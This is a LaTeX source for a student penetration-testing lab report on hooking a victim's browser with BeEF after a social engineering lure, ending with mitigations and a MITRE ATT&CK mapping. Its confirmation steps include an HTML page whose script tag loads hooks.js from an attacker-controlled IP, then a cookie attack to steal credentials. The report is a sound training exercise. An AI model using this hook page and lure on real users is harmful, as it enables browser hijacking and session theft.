@@ -1,0 +1,135 @@
+%  Make this into a pdf document as follows:
+%
+%
+% The edit the Report.tex file appropriately to include only those elements that
+% make sense for the assignment you're reporting on.
+%
+% You can use a tool like TeXShop or Texmaker or some other graphical tool
+% to convert Report.text into a pdf fi le.
+%
+% If you are making this with command line tools, you'd run the following command:
+%
+%     latex Report.tex
+%
+% That will generate a dvi (device independent) document file called Report.dvi
+% The pages reported in the table of contents won't be correct, since latex only
+% processes one pass over the document. To adjust the page numbers in the contents,
+% run latex again:
+%
+%    latex Report.tex
+%
+% Then run
+%
+%   dvipdf Report.dvi
+%
+% to generate Report.pdf
+%
+% You can view this file to check it out by running
+%
+% xdg-open Report.pdf
+%
+% That's it.
+
+\def\cvss(#1,#2,#3,#4,#5,#6,#7,#8,#9){
+	\indent\textbf{CVSS Base Severity Rating: #9}  AV:#1 AC:#2 PR:#3 UI:#4 S:#5 C:#6 I:#7 A:#8}
+
+\def\ttp(#1, #2, #3, #4, #5, #6){
+	\indent\textbf{#1:} #2 \\
+	\indent\indent\textbf{#3:} #4 \\
+	\indent\indent\indent\textbf{#5:} #6 \\}
+
+\documentclass[notitlepage]{article}
+
+\usepackage{bibunits}
+\usepackage{comment}
+\usepackage{graphicx}
+\usepackage{amsmath}
+\usepackage{datetime}
+\usepackage{numprint}
+
+% processes above options
+\usepackage{palatino}  %OR newcent ncntrsbk helvet times palatino
+\usepackage{url}
+\usepackage{footmisc}
+\usepackage{endnotes}
+\usepackage{hyperref}
+\hypersetup{
+	colorlinks=true,
+	linkcolor=blue,
+	filecolor=magenta,      
+	urlcolor=cyan,
+	pdftitle={Overleaf Example},
+	pdfpagemode=FullScreen,
+}
+\urlstyle{same}
+
+\setcounter{secnumdepth}{0}
+\begin{document}
+	
+	\nplpadding{2}
+	\newdateformat{isodate}{
+		\THEYEAR -\numprint{\THEMONTH}-\numprint{\THEDAY}}
+	
+	\title{PenTest Lab Exercise Ex110 - BeEF Hooking}
+	\author{Jonathan Trost}
+	\date{\isodate\today}
+	
+	\maketitle
+	
+	\tableofcontents
+	
+	\newpage
+	
+	\subsection{Summary of Findings}
+	\indent Credentials of a user were taking uses a social engineering attack and directing employee to a site that allows the stealing of credentials. 
+	
+	\subsection{Finding: \emph{Stolen Credentials Using BeEF}}
+	
+	\subsubsection{Severity Rating}
+	\indent The severity is 7.6. The credentials can only be stolen with the participation of a victim. The stealing of credentials could allow a great deal of access depending on the users permissions. 
+	
+	\textbackslash cvss(N,L,N,R,U,H,L,L,7.6)\\
+	\cvss(N,L,N,R,U,H,L,L,7.6) \\
+	
+	\subsubsection{Vulnerability Description}
+	\indent The vulnerability gives attack user credentials for your system.  
+	
+	\subsubsection{Confirmation method}
+	To confirm the exploit use: \\
+	\indent 1. Start up web server, \textbf{apache2} in our case. \textbf{sudo service apache2.}  \\
+	\indent 2. If on linux, create web file, in our case \textbf{collections.html} in \textbf{w/var/www/html/coins/} directory. \\  
+	\indent 3. Paste the following code into the file: \\
+	\indent \indent \textless!DOCTYPE html\textgreater \\
+	\indent \indent \indent \textless html\textgreater \\
+	\indent \indent \indent \indent \textless body \textgreater \\
+	\indent\indent\indent\indent\indent \textless script type="text/javascript" src="\textbf{YOUR IP ADDRESS}:3000/hooks.js" \textgreater \textless /script \textgreater \\
+	\indent\indent\indent\indent \textless /body\textgreater\\
+	\indent\indent\indent \textless /html\textgreater \\
+	\indent 4. Restart \textbf{apache2} server. \textbf{sudo service apache2 restart}. \\
+	\indent 5. Install \textbf{BeEF} per their instructions.\\ \href{https://github.com/beefproject/beef/wiki/Configuration}{BeET Github}.\\
+	\indent 6. Start \textbf{BeEF} per their instructions.\\
+	\indent 7. Open browser and enter 'http://\textbf{YOUR IP ADDRESS} and press enter. \\
+	\indent 8. You should see your IP address in the BeEF software and can run a cookie attack to steal credentials.  \\
+	
+	\subsubsection{Mitigation or Resolution Strategy}
+	\indent 1. User Training on Phishing attacks. \\
+	\indent 2. Configure brower system to regularly delete cookies. \\
+	\indent 3. Use Multi-factor Authentication.\\
+	
+	\section{Attack Narrative}
+	
+	\indent Pr0b3 performed a social engineering attack, convincing the owner of d.darkblood that there was a website that would soon be online that was of interest to them. The target was given a pr0b3 web address. To ensure we targeted the correct user. The \textbf{wireshark} software was used to observer network traffic.  Below is the traffic of interest from the target user as they attempt to access the website we used to launch our attack. \\ \\
+	\includegraphics[width=4in]{ex110_1.jpg} \\\\
+	\indent With the user confirmed, we setup the attack website as described in the confirmation section. The victim was hooked and below you'll see evidence in the \textbf{BeEF} software that a computer from Art's Tailor was hooked.\\
+	\includegraphics[width=4in]{ex110_2.jpg} \\\\
+	The credentials were then stolen as evidenced by the below screenshot.\\
+	\includegraphics[width=4in]{ex110_3.jpg} \\\\
+	
+	
+	\subsection{MITRE ATT{\&}CK Framework TTPs}
+	
+	\indent\textbackslash ttp(TA0006, Credential Access, T1539, Steal Web Session Cookie, BeEF, Browser Exploitation Framework) \\
+	\ttp(TA0006, Credential Access, T1539, Steal Web Session Cookie, BeEF, Browser Exploitation Framework) \\
+	
+
+\end{document} 
